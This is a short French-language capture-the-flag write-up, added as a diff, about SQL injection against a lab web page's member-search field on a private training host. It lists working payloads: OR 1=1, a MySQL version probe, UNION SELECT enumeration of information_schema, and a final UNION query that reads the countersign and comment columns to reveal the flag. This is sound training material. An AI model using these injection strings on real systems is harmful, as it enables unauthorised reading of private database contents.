@@ -1,0 +1,51 @@
+sur http://192.168.99.102/?page=member
+
+On peu voir un field pour rechercher par Id.
+
+Si on entre 1 OR 1 = 1:
+First name: Flag
+Surname : GetThe
+
+On peux voir qu'un first name est "Flag"
+
+Avec la requete suivante: 1 AND MID(VERSION(),1,1) = 5;
+On obtiens la version de mysql... pas utile 
+
+
+Avec la requete suivante: 1 UNION SELECT * FROM Users
+on obtiens une erreur: Table 'Member_Sql_Injection.Users' doesn't exist
+on en deduis le nom de la db: Member_Sql_Injection
+
+
+
+1 UNION SELECT * FROM Users
+1 AND 1=2 UNION ALL SELECT * FROM information_schema.columns
+
+Nous avons une erreur:
+The used SELECT statements have a different number of columns
+
+parce que "select * from ..." est la sélection de toutes les colonnes du tableau des users.
+c'est pourquoi lorsque nous avons essayé d'unir plus de 2 colonnes avec elle, nous avons cette erreur.
+
+En essayant de select que deux colonnes avec cette commande:
+1 AND 1=2 UNION ALL SELECT table_name, column_name FROM information_schema.columns
+
+Nous affiche toutes les tables et colonnes
+On peux voir la table qui nous interesse ici c'est: Users
+qui contient les colonnes suivantes:
+user_id
+first_name
+last_name
+town
+country
+planet
+Commentaire
+countersign
+
+testons alors les deux dernieres qui ont l'air suspectes.... :
+
+1 AND 1 = 2 UNION ALL SELECT countersign, Commentaire FROM users
+
+bingo !
+
+
